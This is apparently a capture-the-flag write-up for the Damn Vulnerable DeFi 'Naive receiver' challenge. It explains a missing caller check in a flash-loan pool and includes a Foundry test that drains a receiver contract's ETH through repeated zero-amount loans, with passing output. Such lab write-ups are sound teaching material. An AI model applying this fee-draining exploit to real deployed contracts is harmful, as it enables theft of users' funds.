#	Damn Vulnerable DeFi (Foundry version)
- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

##	Challenge #2 - Naive receiver - Description

There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

##  Scope

| File Name                                                                             | SHA-1 Hash                               |
| ------------------------------------------------------------------------------------- | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/naive-receiver/FlashLoanReceiver.sol       | 2d0b8afa012f14ced93983753579427e18237343 |
| damn-vulnerable-defi-foundry/src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol | a27449df324b72e086fc07334775b0e582ba4032 |

##  Plan

From the description we can understand that we must drain all 10 ETH from user's contract. Most probably by constantly receiving flash loans as this lending pool offering `quite expensive` flash loans. So, we are looking for a missing check or not proper check of whoever is requesting a flash loan if he is the owner of the contract.

## Solution

<details>
    <summary>Description</summary>

In function [`flashLoan()`](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol#L24) there are two checks:
1.  [NotEnoughETHInPool](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol#L29)

    ```solidity
    if (balanceBefore < borrowAmount) revert NotEnoughETHInPool();
    ```

2.  [BorrowerMustBeADeployedContract](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol#L30)

    ```solidity
    if (!borrower.isContract()) revert BorrowerMustBeADeployedContract();
    ```

None of them are checking if the borrower is the owner of the contract and so anyone can make the transaction.

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/naive-receiver/NaiveReceiver.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(
            address(naiveReceiverLenderPool),
            "Naive Receiver Lender Pool"
        );
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 10; i++) {
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
        }
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
}
```
</details>

### Proof of Concept

```
./run.sh 2
[⠃] Compiling...
[⠒] Compiling 1 files with 0.8.12
[⠘] Solc 0.8.12 finished in 1.68s
Compiler run successful

Running 1 test for test/Levels/naive-receiver/NaiveReceiver.t.sol:NaiveReceiver
[PASS] testExploit() (gas: 123102)
Logs:
  🧨 PREPARED TO BREAK THINGS 🧨

Test result: ok. 1 passed; 0 failed; finished in 2.79ms
```